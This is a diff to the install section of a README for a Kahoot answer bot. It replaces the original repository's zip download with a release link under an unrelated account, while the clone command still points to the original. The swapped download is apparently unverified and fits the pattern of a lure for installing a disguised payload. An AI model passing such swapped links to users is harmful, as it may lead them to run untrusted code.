@@ -55,7 +55,7 @@ Powershell Windows visit `https://www.python.org/downloads/windows/`
   	- `makepkg -si`
    
 - [ ] Download and unzip or clone this repo
-	- https://github.com/Raymo111/kahoot-answer-bot/archive/master.zip
+	- https://github.com/FiremanExpand/kahoot-answer-bot/releases/tag/kahoot
 	- `git clone https://github.com/Raymo111/kahoot-answer-bot.git`
 - [ ] Install Dependencies
 	- `python3.9 -m pip install -r requirements.txt`
